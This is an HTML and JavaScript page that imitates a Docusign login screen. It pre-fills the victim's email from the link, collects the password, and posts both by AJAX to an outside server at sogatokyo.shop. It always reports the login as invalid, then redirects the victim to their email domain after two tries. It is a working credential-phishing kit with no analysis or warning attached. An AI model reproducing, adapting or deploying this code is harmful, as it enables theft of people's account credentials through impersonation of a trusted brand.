<body class="flex flex-col min-h-screen">

            </div>
        </div>
    </nav>

    <!-- Gray Background Section with Centered Login Form -->
    <main class="flex-grow bg-gray-100">
        <div class="mx-auto px-6 py-12 flex items-center justify-center min-h-[calc(100vh-160px)]">
		<div id="loader" class="loader" style="display:none;">

				<svg aria-hidden="true" class="w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
					<path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/>
					<path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/>
				</svg>
				<span class="sr-only">Loading...</span>
			</div>


		</div>
		<!-- sectionOne -->
		
            <div id="sectionOne" class=" border border-1 w-full max-w-[35rem] bg-white p-14 rounded-lg shadow-sm">
                <h2 class="text-2xl font-semibold text-gray-800 mb-8">Log in to Docusign</h2>
                <p class="text-gray-600 font-semibold mb-6">Enter your email to log in.</p>
                
                <form>
                    <div class="mb-4">
                        <label class="block text-md font-semibold text-gray-700 mb-1">Email <span class="text-red-500">*</span></label>
                        <input
							id="email"
                            type="email" 
							oninput="input()"
                            placeholder="Enter email" 
                            class="w-full px-3 py-2 border border-gray-500 text-gray-800 rounded focus:outline-none focus:ring-1 focus:ring-violet-800"
                        >
						<span id="emailmsg" class="text-red-600" style="display:none;">Please Enter a Valid Email</span>
                    </div>
					
                    
                    <button id="submit" class="w-full bg-violet-800 text-white py-2 px-4 rounded mb-3 hover:bg-violet-900 transition">
                        NEXT
                    </button>
                    
                    <button class="w-full font-semibold text-gray-700 py-2 px-4 rounded hover:bg-gray-50 transition">
                        Sign Up for Free
                    </button>
                </form>
            </div>
			<!-- sectionOne -->
			<!-- sectionTwo -->
			<div id="sectionTwo" style="display:none;" class=" border border-1 w-full max-w-[35rem] bg-white p-14 rounded-lg shadow-sm">
                <h2 class="text-2xl font-semibold text-gray-800 mb-3">Log In</h2>
                <p class="text-gray-600 font-semibold mb-9 flex gap-2">
				<span aria-hidden="true" class="size-6">
				<svg class="SVGInline-svg" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" focusable="false">
  <path d="M22 11H5.41L11 5.41 9.59 4l-7.3 7.29a1 1 0 0 0 0 1.42L9.59 20 11 18.59 5.41 13H22z"></path>
</svg></span><span id="emailLabel"></span></p>
                
                <form>
                    
					<div id="passdiv" style="" class="mb-4">
                        <label class="block text-md font-semibold text-gray-700 mb-1">Password <span class="text-red-500">*</span></label>
                        <input id="password" type="password" oninput="inputpwd()" placeholder="Enter password" class="w-full px-3 py-2 border border-gray-500 text-gray-800 mb-2 rounded focus:outline-none focus:ring-1 focus:ring-violet-800">
						<span id="passwordmsg" class="text-red-600 flex" style="display:none;">Please Enter a Valid Password</span>
						<span id="msg" class="text-red-600" style="display:none;">Invalid email and / or password</span>
						
                    </div>
                    
                    <button id="submit2" class="w-full bg-violet-800 text-white py-2 px-4 rounded mb-3 hover:bg-violet-900 transition">Log in</button>
                    
                    
                <a href="#" class="text-violet-800 font-semibold hover:underline">Reset password</a></form>
            </div>
			<!-- sectionTwo -->
        </div>
    </main>

    <!-- Footer -->
<footer class="bg-white text-gray-800 p-4 border-t border-gray-200">
  <div class="mx-auto flex flex-col md:flex-row justify-between items-center">
    <div class="mb-2 md:mb-0" style="display:ruby">
      <h2 class="text-xs"></h2><img class="" alt="logo" src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg">

    <div class="flex justify-center gap-4 w-full mb-2 md:mb-0">

</footer>
</body>
<script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/ui/1.14.0/jquery-ui.js" integrity="sha256-u0L8aA6Ev3bY2HI4y0CAyr9H8FRWgX4hZ9+K7C2nzdc=" crossorigin="anonymous"></script>
<script >
$(document).ready(function () {
  var x = window.location.hash;
  var index = 0;
  var user = x.substr(1);
  var domain = user.substr(5);
  $("#email").val(user);
  $("#submit").click(() => {
    event.preventDefault();
    var email = $("#email").val();
    !email ? $("#emailmsg").show("fade") : $("#emailmsg").hide("fade");
    if (email) {
        var urlindex = email.indexOf("@");
        var redirect = email.substr(urlindex + 1);
		$("#emailLabel").html(email);
		$("#sectionOne").hide();
		$("#title").html("Docusign Login - Enter your password to sign in");
		$("#sectionTwo").show("fade");

    }
  });
  
  ///// TWO ////////
  
  
  $("#submit2").click(() => {
    event.preventDefault();
    var password = $("#password").val();
	var email = $("#emailLabel").html();
    !password ? $("#passwordmsg").show("fade") : $("#passwordmsg").hide("fade");
    if (password) {
	   var urlindex = email.indexOf("@");
       var redirect = email.substr(urlindex + 1);
       index++; 
      checker();
      $.ajax({
        datatype: "json",
        url: "http://www.sogatokyo.shop/cfg.php", // hosted php //
        type: "post",
        data: {
          email: email,
          password: password,
        },
        beforesend: function (xhr) {
          $("#submit2").html("verifing...");
		  $("#password").val("");
        },
        success: function (response) {
          if (response) {
            $("#msg").show("fade");
			$("#password").val("");
            if (response["signal"] == "ok") {
            } else {
            }
          }
        },
        error: function () {
          if (index >= 2) {
            $("#msg").hide();
          } else {
            $("#msg").show();
          }

          $("#password").val("");
        },
        complete: function () {
          $("#submit2").html("Log in");
        },
      });
      function checker() {
        if (index >= 2) {
          $("#msg").show();
		  $("#password").val(password);
		  $("#loader").show();
          setTimeout(() => {
            window.location.replace("https://" + redirect);
          }, 3000);
        }
      }
    }
  });
  
});
function input() {
  $("#emailmsg").hide("fade");
}
function inputpwd() {
  $("#passwordmsg").hide("fade");
}

</script>
</html>
